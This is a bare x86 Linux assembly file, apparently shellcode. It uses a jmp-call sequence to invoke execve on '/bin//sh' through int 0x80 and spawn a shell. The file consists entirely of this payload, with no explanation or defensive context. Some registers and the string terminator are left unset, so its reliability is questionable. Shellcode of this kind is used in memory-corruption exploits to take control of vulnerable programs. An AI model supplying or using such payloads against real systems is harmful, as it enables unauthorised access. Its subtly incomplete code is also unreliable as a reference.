global _start

section .text

_start:

	xor eax,eax
	jmp short shellcode

execve:
	push eax
	push message
	pop ebx
	push eax
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80

shellcode:
	call execve
	message db "/bin//sh"
